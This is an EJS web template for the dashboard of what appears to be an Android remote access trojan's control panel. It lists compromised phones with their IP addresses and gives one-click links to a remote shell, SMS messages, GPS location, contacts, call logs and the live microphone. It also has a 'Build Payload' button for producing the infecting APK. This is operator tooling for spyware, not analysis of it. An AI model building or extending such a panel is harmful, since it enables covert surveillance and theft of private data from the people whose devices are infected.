<!DOCTYPE html>
<html class="dark">
<% include partials/head.ejs %>
<body class="bg-bg-dark min-h-screen">
    <% include partials/header-new.ejs %>
    <% include partials/sidebar-new.ejs %>

    <!-- Main content -->
    <div class="ml-56 mt-14 p-6 space-y-6">
        <!-- Page title -->
        <div class="flex items-center justify-between">
            <h1 class="text-2xl font-bold text-white">Dashboard</h1>
            <div class="flex items-center gap-3">
                <button class="btn-ghost text-sm" onclick="window.location.reload()">
                    <svg class="w-4 h-4 inline mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
                    Refresh
                </button>
            </div>
        </div>

        <!-- Stats cards row -->
        <div class="grid grid-cols-4 gap-4">
            <div class="glass rounded-xl p-5 glow-green">
                <div class="flex items-center justify-between mb-3">
                    <span class="text-slate-400 text-sm font-medium">Online</span>
                    <span class="status-online"></span>
                </div>
                <div class="text-4xl font-bold text-white"><%= clientsOnline.length %></div>
            </div>
            <div class="glass rounded-xl p-5 glow-blue">
                <div class="flex items-center justify-between mb-3">
                    <span class="text-slate-400 text-sm font-medium">Total</span>
                    <svg class="w-5 h-5 text-accent-blue" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
                </div>
                <div class="text-4xl font-bold text-white"><%= clientsOnline.length + clientsOffline.length %></div>
            </div>
            <div class="glass rounded-xl p-5 gradient-amber glow-amber">
                <div class="flex items-center justify-between mb-3">
                    <span class="text-slate-400 text-sm font-medium">Offline</span>
                    <svg class="w-5 h-5 text-accent-amber" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.242 2.829a5 5 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"/></svg>
                </div>
                <div class="text-4xl font-bold text-white"><%= clientsOffline.length %></div>
            </div>
            <div class="glass rounded-xl p-5 gradient-green">
                <div class="flex items-center justify-between mb-3">
                    <span class="text-slate-400 text-sm font-medium">Commands</span>
                    <svg class="w-5 h-5 text-accent-green" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
                </div>
                <div class="text-4xl font-bold text-white">Live</div>
            </div>
        </div>

        <!-- Device Cards -->
        <% if (clientsOnline.length > 0 || clientsOffline.length > 0) { %>
        <div class="space-y-4">
            <% clientsOnline.forEach(function(c) { 
                let dd = c.dynamicData || {};
                let dev = dd.device || {};
            %>
            <!-- Online Device Card -->
            <div class="glass rounded-xl p-5 hover:border-accent-green/30 transition-all cursor-pointer" onclick="window.location='/manage/<%= c.clientID %>/info'">
                <div class="flex items-center justify-between">
                    <div class="flex items-center gap-4">
                        <div class="w-12 h-12 bg-gradient-to-br from-accent-green to-accent-cyan rounded-xl flex items-center justify-center">
                            <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
                        </div>
                        <div>
                            <div class="flex items-center gap-2">
                                <h3 class="text-white font-bold text-lg"><%= c.nickname || dev.model || 'Unknown Device' %></h3>
                                <button onclick="event.stopPropagation(); renameDevice('<%= c.clientID %>', '<%= c.nickname || '' %>')" class="text-slate-600 hover:text-accent-blue transition-colors" title="Rename">
                                    <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"/></svg>
                                </button>
                                <span class="status-online"></span>
                                <span class="text-accent-green text-xs font-medium">Online</span>
                            </div>
                            <p class="text-slate-400 text-sm"><%= dev.manufacture || dev.manufacturer || 'Unknown' %> &middot; <%= dev.release || 'Unknown' %> &middot; SDK <%= dev.sdk || '?' %></p>
                            <p class="text-slate-500 text-xs mt-0.5 font-mono"><%= dd.clientIP || 'N/A' %></p>
                        </div>
                    </div>
                    <div class="flex items-center gap-2">
                        <!-- Quick action buttons -->
                        <a href="/manage/<%= c.clientID %>/terminal" class="btn-ghost text-xs px-3 py-2 flex items-center gap-1.5" onclick="event.stopPropagation()" title="Terminal">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
                            Shell
                        </a>
                        <a href="/manage/<%= c.clientID %>/sms" class="btn-ghost text-xs px-3 py-2 flex items-center gap-1.5" onclick="event.stopPropagation()" title="SMS">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"/></svg>
                            SMS
                        </a>
                        <a href="/manage/<%= c.clientID %>/location" class="btn-ghost text-xs px-3 py-2 flex items-center gap-1.5" onclick="event.stopPropagation()" title="Location">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/></svg>
                            GPS
                        </a>
                        <a href="/manage/<%= c.clientID %>/contacts" class="btn-ghost text-xs px-3 py-2 flex items-center gap-1.5" onclick="event.stopPropagation()" title="Contacts">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"/></svg>
                            Contacts
                        </a>
                        <a href="/manage/<%= c.clientID %>/calls" class="btn-ghost text-xs px-3 py-2 flex items-center gap-1.5" onclick="event.stopPropagation()" title="Call Logs">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"/></svg>
                            Calls
                        </a>
                        <a href="/manage/<%= c.clientID %>/microphone" class="btn-ghost text-xs px-3 py-2 flex items-center gap-1.5" onclick="event.stopPropagation()" title="Microphone">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"/></svg>
                            Mic
                        </a>
                        <button class="btn-danger text-xs px-3 py-2 deleteDevice" data-client="<%= c.clientID %>" onclick="event.stopPropagation()" title="Delete">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
                        </button>
                    </div>
                </div>
            </div>
            <% }); %>

            <% clientsOffline.forEach(function(c) { 
                let dd = c.dynamicData || {};
                let dev = dd.device || {};
            %>
            <!-- Offline Device Card -->
            <div class="glass rounded-xl p-5 opacity-60 hover:opacity-100 transition-all cursor-pointer" onclick="window.location='/manage/<%= c.clientID %>/info'">
                <div class="flex items-center justify-between">
                    <div class="flex items-center gap-4">
                        <div class="w-12 h-12 bg-slate-700 rounded-xl flex items-center justify-center">
                            <svg class="w-6 h-6 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.242 2.829a5 5 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"/></svg>
                        </div>
                        <div>
                            <div class="flex items-center gap-2">
                                <h3 class="text-slate-300 font-bold text-lg"><%= c.nickname || dev.model || 'Unknown Device' %></h3>
                                <button onclick="event.stopPropagation(); renameDevice('<%= c.clientID %>', '<%= c.nickname || '' %>')" class="text-slate-600 hover:text-accent-blue transition-colors" title="Rename">
                                    <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"/></svg>
                                </button>
                                <span class="status-offline"></span>
                                <span class="text-slate-500 text-xs">Offline</span>
                            </div>
                            <p class="text-slate-500 text-sm"><%= dev.manufacture || dev.manufacturer || 'Unknown' %> &middot; Last seen: <%= new Date(c.lastSeen).toLocaleString('en-GB', {timeZone:'UTC'}) %></p>
                            <p class="text-slate-600 text-xs mt-0.5 font-mono"><%= dd.clientIP || 'N/A' %></p>
                        </div>
                    </div>
                    <div class="flex items-center gap-2">
                        <button class="btn-danger text-xs px-3 py-2 deleteDevice" data-client="<%= c.clientID %>" onclick="event.stopPropagation()" title="Delete">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
                        </button>
                    </div>
                </div>
            </div>
            <% }); %>
        </div>
        <% } else { %>
        <div class="glass rounded-xl p-12 text-center">
            <svg class="w-16 h-16 text-slate-700 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
            <h3 class="text-white text-lg font-semibold mb-2">No Devices Connected</h3>
            <p class="text-slate-500 text-sm mb-4">Build and install an APK to get started</p>
            <a href="/builder" class="btn-primary inline-flex items-center gap-2">
                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg>
                Build Payload
            </a>
        </div>
        <% } %>
    </div>

    <% include partials/aiPanel.ejs %>

    <% include partials/footer.ejs %>

    <script>
        function renameDevice(id, current) {
            var name = prompt('Set device nickname:', current);
            if (name !== null && name.trim()) {
                $.post('/manage/' + id + '/nickname', { nickname: name.trim() }, function(d) {
                    if (d.error) showNotification('#f03434', d.error);
                    else { showNotification('#2ecc71', d.message); setTimeout(function(){ window.location.reload(); }, 500); }
                });
            }
        }

        $(document).ready(function() {
            // Auto-refresh device list every 10 seconds
            setInterval(function() { window.location.reload(); }, 10000);

            // Delete device
            $('.deleteDevice').click(function(e) {
                e.stopPropagation();
                var id = $(this).data('client');
                if (confirm('Delete device ' + id + '?')) {
                    $.post('/manage/' + id + '/delete', function(d) {
                        if (d.error) showNotification('#f03434', d.error);
                        else { showNotification('#2ecc71', d.message); setTimeout(function(){ window.location.reload(); }, 500); }
                    });
                }
            });
        });
    </script>
</body>
</html>
